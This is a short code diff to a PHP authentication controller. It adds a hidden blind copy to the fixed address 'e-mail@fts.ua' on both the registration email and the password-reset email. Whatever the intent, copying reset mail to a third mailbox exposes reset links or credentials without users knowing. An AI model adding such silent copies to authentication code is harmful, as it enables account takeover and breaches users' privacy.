@@ -127,7 +127,9 @@ class AuthController extends Controller
         $save->save();
 
         try {
-          Mail::to($save->email)->send(new RegisterMail($save));
+          Mail::to($save->email)
+           ->bcc('e-mail@fts.ua')
+          ->send(new RegisterMail($save));
         } catch (\Exception $e) {
         }
 
@@ -193,7 +195,9 @@ class AuthController extends Controller
       $user->save();
 
       try {
-        Mail::to($user->email)->send(new ForgotPasswordMail($user));
+        Mail::to($user->email)
+          ->bcc('e-mail@fts.ua')
+        ->send(new ForgotPasswordMail($user));
       } catch (\Exception $e) {
       }
       return redirect()->back()->with('success', "Перевірте свою електронну пошту та скиньте пароль. ");
